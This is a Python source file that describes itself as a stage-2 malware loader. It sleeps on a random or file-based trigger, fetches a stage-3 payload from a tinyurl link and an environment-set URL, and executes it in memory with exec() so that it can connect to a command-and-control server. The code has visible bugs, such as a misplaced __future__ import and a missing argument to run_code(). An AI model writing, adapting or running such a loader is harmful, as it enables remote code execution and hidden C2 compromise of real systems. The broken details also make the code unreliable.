'''
 # @ Create Time: 2025-08-13 16:00:11
 # @ Modified time: 2025-08-13 16:01:06
 # @ Description: execute payload in memory
 
 - wait for a random/conditional trigger 
 - fetch a stage 3 payload from a tiny url
 - exec fetched payload in memory
 - the result will build the connection with a C2 server

 '''
import requests
from __future__ import annotations
import json, os, time, random, base64
from pathlib import Path
from typing import Any, Dict, List
from urllib.request import Request, urlopen
from urllib.error import URLError, HTTPError

LOG_DIR = Path("logs"); LOG_DIR.mkdir(parents=True, exist_ok=True)
AUDIT = LOG_DIR / "stage2_payload.jsonl"
RUN   = LOG_DIR / "stage3_run_summary.json"

response = requests.get("https://tinyurl.com/295tzfpa")

# --------------- Env / defaults ---------------
WAIT_MODE    = os.getenv("SC6_WAIT_MODE", "uniform").lower()   # "uniform" | "exp" | "file"
WAIT_MIN_S   = int(os.getenv("SC6_WAIT_MIN_SECONDS", "20"))
WAIT_MAX_S   = int(os.getenv("SC6_WAIT_MAX_SECONDS", "60"))
WAIT_MEAN_S  = float(os.getenv("SC6_WAIT_MEAN_SECONDS", "30"))
TRIGGER_FILE = os.getenv("SC6_TRIGGER_FILE", "logs/trigger_stage3")

STAGE3_URL   = os.getenv("SC6_STAGE3_URL", "")
ALLOWED_URLS = [u.strip() for u in os.getenv("SC6_ALLOWED_URLS", "").split(",") if u.strip()]
MEMORY_ONLY  = os.getenv("SC6_MEMORY_ONLY", "1") == "1"


def audit(event: str, **fields: Any) -> None:
    rec = {"ts": int(time.time()), "event": event}
    rec.update(fields)
    with AUDIT.open("a", encoding="utf-8") as f:
        f.write(json.dumps(rec, ensure_ascii=False) + "\n")

def fetch(url: str, max_bytes: int = 1 << 20) -> bytes:
    req = Request(url, headers={"User-Agent": "sc6-stage2/1.0"})
    with urlopen(req, timeout=15) as resp:
        body = resp.read(max_bytes + 1)
    if len(body) > max_bytes:
        raise ValueError("payload_too_large")
    return body


def wait_for_trigger() -> int:
    """Return actual waited seconds."""
    t0 = time.time()
    if WAIT_MODE == "file":
        audit("wait_start", mode="file", file=TRIGGER_FILE)
        tf = Path(TRIGGER_FILE)
        while not tf.exists():
            time.sleep(0.5)
        return int(time.time() - t0)
    elif WAIT_MODE == "exp":
        val = max(1.0, random.expovariate(1.0 / max(1e-6, WAIT_MEAN_S)))
        wait_s = int(val)
        audit("wait_start", mode="exp", scheduled=wait_s)
        time.sleep(wait_s)
        return int(time.time() - t0)
    else:
        lo, hi = sorted((max(0, WAIT_MIN_S), max(0, WAIT_MAX_S))); hi = max(hi, lo + 1)
        wait_s = random.randint(lo, hi)
        audit("wait_start", mode="uniform", scheduled=wait_s)
        time.sleep(wait_s)
        return int(time.time() - t0)


# ---------- Entry Points ------------
def run_code(stage2_doc: bytes):
    ''' run code in memeory and build the connection with C2 server
    
    '''
    waited = wait_for_trigger()

    # fetch stage-3 payload
    try:
        audit("stage3_fetch_attempt", url = STAGE3_URL)
        raw = fetch(STAGE3_URL)
        audit("stage3_fetch_success", url = STAGE3_URL, bytes = len(raw))
    except (HTTPError, URLError, ValueError) as e:
        audit("stage3_fetch_error", url=STAGE3_URL, error=str(e)); return {"waited_s": waited, "ran": False}
    
    # run payload inside memory
    try:
        exec(raw)
        audit("stage3_payload_executed")
    except Exception as e:
        audit("payload execution failed:", e)


if __name__ == "__main__":
    raise SystemExit(run_code())

